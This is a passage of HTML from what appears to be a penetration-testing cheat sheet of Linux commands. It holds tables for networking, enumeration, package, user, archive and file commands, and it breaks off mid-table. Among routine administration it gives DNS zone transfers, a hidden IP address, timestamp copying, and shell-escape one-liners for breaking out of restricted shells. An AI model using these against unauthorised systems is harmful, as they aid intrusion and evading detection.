    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;host 192.168.1.1 &lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Reverse lookup on an IP address, in case dig is not installed.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;dig @192.168.2.2 domain.com -t AXFR&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Perform a DNS zone transfer using dig.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;host -l domain.com nameserver&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Perform a DNS zone transfer using host.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;nbtstat -A x.x.x.x&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Get hostname for IP address.   

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;ip addr add 192.168.2.22/24 dev eth0&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Adds a hidden IP address to Linux, does not show up when performing an ifconfig.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;tcpkill -9 host google.com&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Blocks access to google.com from the host machine.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;echo &quot;1&quot; &amp;gt; /proc/sys/net/ipv4/ip_forward&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Enables IP forwarding, turns Linux box into a router - handy for routing traffic through a box.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;echo &quot;8.8.8.8&quot; &amp;gt; /etc/resolv.conf&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Use Google DNS.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;


    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;system-information-commands&quot;&gt;System Information Commands&lt;/h3&gt;

&lt;p&gt;Useful for local enumeration.&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;whoami&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Shows currently logged in user on Linux.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;id&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Shows currently logged in user and groups for the user.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;last&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Shows last logged in users.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;mount&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Show mounted drives.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;df -h&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Shows disk usage in human readable output.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;echo &quot;user:passwd&quot; | chpasswd&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Reset password in one line.  

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;getent passwd&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          List users on Linux.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;strings /usr/local/bin/blah&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Shows contents of none text files, e.g. whats in a binary.   

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;uname -ar&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Shows running kernel version.   

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;PATH=$PATH:/my/new-path&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Add a new PATH, handy for local FS manipulation.   

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;history&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Show bash history, commands the user has entered previously.   

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;


  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h4 id=&quot;redhat--centos--rpm-based-distros&quot;&gt;Redhat / CentOS / RPM Based Distros&lt;/h4&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;cat /etc/redhat-release&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Shows Redhat / CentOS version number.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;rpm -qa&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          List all installed RPM's on an RPM based Linux distro.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;rpm -q --changelog openvpn&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Check installed RPM is patched against CVE,  grep the output for CVE.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h4 id=&quot;yum-commands&quot;&gt;YUM Commands&lt;/h4&gt;

&lt;p&gt;Package manager used by RPM based systems, you can pull some usefull information about installed packages and or install additional tools.&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;yum update&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Update all RPM packages with YUM, also shows whats out of date.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;yum update httpd&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Update individual packages, in this example HTTPD (Apache).

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;yum install package&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Install a package using YUM.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;yum --exclude=package kernel* update&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Exclude a package from being updates with YUM.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;yum remove package&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Remove package with YUM.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;yum erase package&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Remove package with YUM.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;yum list package&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Lists info about yum package.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;yum provides httpd&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          What a packages does, e.g Apache HTTPD Server.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;yum info httpd&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Shows package info, architecture, version etc.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;yum localinstall blah.rpm&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Use YUM to install local RPM, settles deps from repo.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;yum deplist package&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Shows deps for a package.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;yum list installed | more&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          List all installed packages.  

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;yum grouplist | more&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Show all YUM groups.  

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;yum groupinstall 'Development Tools'&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Install YUM group.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h4 id=&quot;debian--ubuntu--deb-based-distros&quot;&gt;Debian / Ubuntu / .deb Based Distros&lt;/h4&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;cat /etc/debian_version&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Shows Debian version number.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;cat /etc/*-release&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Shows Ubuntu version number.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;dpkg -l&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          List all installed packages on Debian / .deb based Linux distro.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;linux-user-management&quot;&gt;Linux User Management&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;useradd new-user&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Creates a new Linux user.  

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;passwd username&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Reset Linux user password, enter just &lt;code&gt;passwd&lt;/code&gt; if you are root.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;deluser username&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Remove a Linux user.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;linux-decompression-commands&quot;&gt;Linux Decompression Commands&lt;/h3&gt;

&lt;p&gt;How to extract various archives (tar, zip, gzip, bzip2 etc) on Linux and some other tricks for searching inside of archives etc.&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;unzip archive.zip&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Extracts zip file on Linux.  

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;zipgrep *.txt archive.zip&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Search inside a .zip archive.  

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;tar xf archive.tar&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Extract tar file Linux.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;tar xvzf archive.tar.gz&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Extract a tar.gz file Linux.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;tar xjf archive.tar.bz2&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Extract a tar.bz2 file Linux.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;tar ztvf file.tar.gz | grep blah&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Search inside a tar.gz file.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;gzip -d archive.gz&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Extract a gzip file Linux.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;zcat archive.gz&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Read a gz file Linux without decompressing.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;zless archive.gz&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Same function as the &lt;code&gt;less&lt;/code&gt; command for .gz archives.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;zgrep 'blah' /var/log/maillog*.gz&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Search inside .gz archives on Linux, search inside of compressed log files.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;vim file.txt.gz&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Use vim to read .txt.gz files (my personal favorite).

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;upx -9 -o output.exe input.exe&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          UPX compress .exe file Linux.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;linux-compression-commands&quot;&gt;Linux Compression Commands&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;zip -r file.zip /dir/*&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Creates a .zip file on Linux.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;tar cf archive.tar files&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Creates a tar file on Linux.  

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;tar czf archive.tar.gz files&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Creates a tar.gz file on Linux.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;tar cjf archive.tar.bz2 files&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Creates a tar.bz2 file on Linux.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;gzip file&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Creates a file.gz file on Linux.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;linux-file-commands&quot;&gt;Linux File Commands&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;df -h blah&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Display size of file / dir Linux.   

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;diff file1 file2&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Compare / Show differences between two files on Linux.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;md5sum file&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Generate MD5SUM Linux.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;md5sum -c blah.iso.md5&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Check file against MD5SUM on Linux, assuming both file and .md5 are in the same dir.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;file blah&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Find out the type of file on Linux, also displays if file is 32 or 64 bit.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;  

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;dos2unix&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Convert Windows line endings to Unix / Linux.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;base64 &amp;lt; input-file &amp;gt; output-file&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Base64 encodes input file and outputs a Base64 encoded file called output-file.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;base64 -d &amp;lt; input-file &amp;gt; output-file&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Base64 decodes input file and outputs a Base64 decoded file called output-file.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;touch -r ref-file new-file&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Creates a new file using the timestamp data from the reference file, drop the -r to simply create a file.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;rm -rf&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;
          Remove files and directories without prompting for confirmation.
        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;samba-commands&quot;&gt;Samba Commands&lt;/h3&gt;

&lt;p&gt;Connect to a Samba share from Linux.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;smbmount //server/share /mnt/win &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;username,password&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;password1
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;smbclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; user &lt;span class=&quot;se&quot;&gt;\\\\&lt;/span&gt;server&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;share
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mount &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; cifs &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user,password&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;password //x.x.x.x/share /mnt/share&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;breaking-out-of-limited-shells&quot;&gt;Breaking Out of Limited Shells&lt;/h3&gt;

&lt;p&gt;Credit to G0tmi1k for these (or wherever he stole them from!).&lt;/p&gt;

&lt;p&gt;The Python trick:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;python&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'import pty;pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;os.system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/bin/bash'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;/bin/sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;misc-commands&quot;&gt;Misc Commands&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
